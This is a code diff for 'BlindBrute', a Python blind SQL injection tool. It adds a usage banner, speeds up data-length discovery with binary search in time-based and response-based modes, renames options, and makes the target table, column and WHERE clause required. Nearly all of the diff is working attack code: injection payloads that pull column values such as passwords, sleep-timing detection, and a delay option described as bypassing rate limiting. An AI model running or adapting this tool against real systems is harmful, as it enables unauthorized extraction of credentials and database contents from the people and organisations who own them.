@@ -8,6 +8,45 @@ import sys
 import select
 from urllib.parse import quote
 
+def usage():
+    usage = """
+    BlindBrute - Blind SQL Injection Script with Header and File Support
+
+    Usage:
+        python blindbrute.py -u <URL> -t <TABLE> -c <COLUMN> -w <WHERE CLAUSE> [options]
+
+    Required Arguments:
+        -u, --url                    Target URL
+        -t, --table                  Table name from which to extract the data
+        -c, --column                 Column name to extract (e.g., Password)
+        -w, --where                  WHERE clause (e.g., Username = 'Administrator')
+
+    Optional Arguments:
+        -ih, --injectable-headers    Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com)
+        -sh, --static-header         Static headers as key-value pairs that do not contain payloads
+        -d, --data                   Specify data to be sent in the request body. Changes request type to POST.
+        -f, --file                   File containing the HTTP request with 'INJECT' placeholder for payloads
+        -m, --max-length             Maximum length of the extracted data that the script will check for (default: 1000)
+        -ba, --binary-attack         Use binary search for ASCII extraction
+        -da, --dictionary-attack     Path to a wordlist file for dictionary-based extraction
+        --delay                      Delay in seconds between requests to bypass rate limiting
+        --timeout                    Timeout for each request in seconds (default: 10)
+        --verbose                    Enable verbose output for debugging
+        --true-keywords              Keywords to search for in the true condition (e.g., 'Welcome', 'Success')
+        --false-keywords             Keywords to search for in the false condition (e.g., 'Error', 'Invalid')
+        --sleep-only                 Use only sleep-based detection methods
+
+    Examples:
+        python blindbrute.py -u "http://example.com/login" -t users -c password -w "username='admin'"
+        python blindbrute.py -u "http://example.com/login" -ih Cookie "SESSION=abc123" -t users -c password -w "username='admin'"
+        python blindbrute.py -f request.txt -t users -c password -w "username='admin'" --binary-attack
+
+    Description:
+        BlindBrute is a tool for performing blind SQL injection attacks. It supports detecting vulnerabilities using status codes, content length, 
+        keyword comparisons, and time-based SQL injection techniques. Custom headers, data, and HTTP request templates can be used for precise control.
+    """
+    print(usage)
+
 CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
 
 def load_version_queries():
@@ -117,6 +156,7 @@ def is_injectable(url, request_template=None, injectable_headers={}, static_head
     return False, None
 
 def detect_database(url, request_template=None, injectable_headers={}, static_headers={}, detection="status", args=None):
+    
     print("[*] Attempting to detect the database type...")
 
     if args.verbose and not args.sleep_only:
@@ -167,14 +207,18 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
         print(f"[-] Length function not found for {db_name}.")
         return None
 
-    if args.verbose:
-        print(f"[VERBOSE] Attempting to discover the length of the data for {table}.{column} using {length_function}...")
+    print(f"[*] Attempting to discover the length of the data for {table}.{column} using {length_function}...")
 
-    # Override
-    if args.sleep_only:
-        print("[*] Sleep-only mode enabled. Attempting sleep-based length discovery...")
-        for length in range(1, max_length + 1):
-            payload = f"' AND {sleep_function} AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {length}"
+    # Sleep Override
+    if args.sleep_only and sleep_function:
+        print(f"[*] Sleep-only mode enabled. Attempting sleep-based length discovery...")
+        low = 1
+        high = max_length
+        length = None
+
+        while low <= high:
+            mid = (low + high) // 2
+            payload = f"' AND {sleep_function} AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
             encoded_payload = quote(payload)
 
             try:
@@ -191,19 +235,25 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
                     return None
 
                 if response_time > 5:
-                    print(f"[+] Sleep-based data length discovered: {length}")
-                    return length
-
-                if args.verbose and args.delay > 0:
-                    print(f"[VERBOSE] Sleeping for {args.delay} seconds...")
-                    time.sleep(args.delay)
+                    high = mid - 1
+                    length = mid
+                else:
+                    low = mid + 1
 
             except requests.exceptions.RequestException as e:
                 print(f"[-] Error during sleep-based length discovery: {e}")
                 return None
 
-        print(f"[-] Failed to discover data length within the maximum length {max_length} using sleep-based detection.")
-        return None
+        if length:
+            print(f"[+] Sleep-based data length discovered: {length}")
+            return length
+        else:
+            print(f"[-] Failed to discover data length within the maximum length {max_length} using sleep-based detection.")
+            return None
+
+    low = 1
+    high = max_length
+    length = None
 
     # Step 1: Baseline request
     try:
@@ -214,9 +264,10 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
         print(f"[-] Error during baseline request: {e}")
         return None
 
-    # Step 3: Test lengths
-    for length in range(1, max_length + 1):
-        payload = f"' AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {length}"
+    # Step 2: Test lengths
+    while low <= high:
+        mid = (low + high) // 2
+        payload = f"' AND {length_function}((SELECT {column} FROM {table} WHERE {where_clause})) = {mid}"
         encoded_payload = quote(payload)
 
         try:
@@ -232,29 +283,39 @@ def discover_length(url, table, column, where_clause, db_name, detection="status
             if not response:
                 return None
 
-            if args.verbose:
-                print(f"[VERBOSE] Sent request with payload to discover length: {encoded_payload}")
-                print(f"[VERBOSE] Response status: {response.status_code}, content length: {len(response.text)}")
-
             if detection == "keyword":
                 if args.true_keywords and any(keyword in response.text for keyword in args.true_keywords):
-                    print(f"[+] Data length discovered: {length}")
-                    return length
+                    high = mid - 1
+                    length = mid
+                elif args.false_keywords and any(keyword in response.text for keyword in args.false_keywords):
+                    low = mid + 1
+                else:
+                    low = mid + 1
+
             elif detection == "status":
                 if response.status_code != baseline_status_code:
-                    print(f"[+] Data length discovered: {length} (Status code changed: {response.status_code})")
-                    return length
+                    high = mid - 1
+                    length = mid
+                else:
+                    low = mid + 1
+
             elif detection == "content":
                 if len(response.text) != baseline_content_length:
-                    print(f"[+] Data length discovered: {length} (Content length changed: {len(response.text)})")
-                    return length
+                    high = mid - 1
+                    length = mid
+                else:
+                    low = mid + 1
 
         except requests.exceptions.RequestException as e:
             print(f"[-] Error during length discovery: {e}")
             return None
 
-    print(f"[-] Failed to discover data length within the maximum length {max_length}.")
-    return None
+    if length:
+        print(f"[+] Data length discovered: {length}")
+        return length
+    else:
+        print(f"[-] Failed to discover data length within the maximum length {max_length}.")
+        return None
 
 def extract_data(url, table, column, where_clause, string_function, position, db_name, data_length, request_template=None, injectable_headers={}, static_headers={}, extraction="status", args=None):
 
@@ -292,7 +353,7 @@ def extract_data(url, table, column, where_clause, string_function, position, db
         return extracted_data
 
     # Binary Override
-    if args.binary:
+    if args.binary_attack:
         while position <= data_length:
             low, high = 32, 126
             found_match = False
@@ -385,7 +446,7 @@ def no_length():
         elif user_input == 'n':
             return False
     else:
-        print("\n[*] No input received within 20 seconds. Proceeding with extraction anyway.")
+        print("\n[*] No input received. Proceeding with extraction anyway.")
         return True
 
 def load_request(file_path):
@@ -679,16 +740,16 @@ def main():
 
     parser = argparse.ArgumentParser(description="Blind SQL Injection Script with header and File Support")
 
-    parser.add_argument('-u', '--url', required=False, help="Target URL")
+    parser.add_argument('-u', '--url', required=True, help="Target URL")
     parser.add_argument('-ih', '--injectable-headers', action='append', nargs=2, metavar=('key', 'value'), help="Injectable headers as key-value pairs (e.g., -ih Referer http://www.example.com -ih X-Fowarded-For 127.0.0.1)")
     parser.add_argument('-sh', '--static-header', action='append', nargs=2, metavar=('key', 'value'), help="Static headers as key-value pairs that do not contain payloads (e.g., -sh session_id abcdefg12345abababab123456789012)")
     parser.add_argument('-d','--data', required=False, help="Specify data to be sent in the request body. Changes request type to POST.")
     parser.add_argument('-f', '--file', required=False, help="File containing the HTTP request with 'INJECT' placeholder for payloads")
-    parser.add_argument('-t', '--table', required=False, help="Table name from which to extract the data")
-    parser.add_argument('-c', '--column', required=False, help="Column name to extract (e.g., Password)")
-    parser.add_argument('-w', '--where', required=False, help="WHERE clause (e.g., Username = 'Administrator')")
+    parser.add_argument('-t', '--table', required=True, help="Table name from which to extract the data")
+    parser.add_argument('-c', '--column', required=True, help="Column name to extract (e.g., Password)")
+    parser.add_argument('-w', '--where', required=True, help="WHERE clause (e.g., Username = 'Administrator')")
     parser.add_argument('-m', '--max-length', type=int, default=1000, help="Maximum length of the extracted data that the script will check for (default: 1000)")
-    parser.add_argument('-bi', '--binary', action='store_true', help="Use binary search for ASCII extraction")
+    parser.add_argument('-ba', '--binary-attack', action='store_true', help="Use binary search for ASCII extraction")
     parser.add_argument('-da', '--dictionary-attack', required=False, help="Path to a wordlist file for dictionary-based extraction.")
     parser.add_argument('--delay', type=float, default=0, help="Delay in seconds between requests to bypass rate limiting")
     parser.add_argument('--verbose', action='store_true', help="Enable verbose output for debugging")
@@ -698,6 +759,10 @@ def main():
     parser.add_argument('--timeout', type=int, default=10, help="Timeout for each request in seconds")
 
     args = parser.parse_args()
+
+    if len(sys.argv) == 1:
+        usage()
+        return
 
     if not args.url and not args.file:
         print("[-] You must provide either a URL (-u) or a request file (-f).")
